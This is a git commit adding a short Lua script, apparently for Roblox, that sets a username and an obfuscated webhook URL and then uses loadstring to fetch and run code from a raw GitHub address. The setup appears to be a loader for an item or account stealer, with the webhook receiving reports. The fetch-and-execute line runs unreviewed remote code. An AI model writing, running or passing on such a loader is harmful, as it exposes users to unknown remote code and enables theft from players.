f0599adc5d6b6517a5f36bbd0ab248df5d4eaeda
adurezz <ikwhynwordssoblack@gmail.com>
2025-03-30 15:55:50 +0200

    adurezz.lua

---
+++ adurezz.lua
@@ -0,0 +1,4 @@
+Username = "mynameismemes30" -- << Your Username
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=VDc0a29IeHVzc1l1UVVhQXpzNzRmQTp0ZjJkRnNWLTAyTjVDNnJXS3BkSzRoeXpNT0g1Vm9LQU5JQklERXQzVlhPRDczNkEyNVF3ak5RMnczd2MwejFGUURCaU1mR2xGQVBxNG8wbm14cHBVa2prVjViMHlHMlplVEVhVXVVdlZwSkc3M1FtY29UVWdBLUswRmVZODBMZk1tTkxLMnR4QlFJODBHZDZSUV9LdnVRTS1vRFFZU0JURnZqd1RJWDdaS00" -- << Your Webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
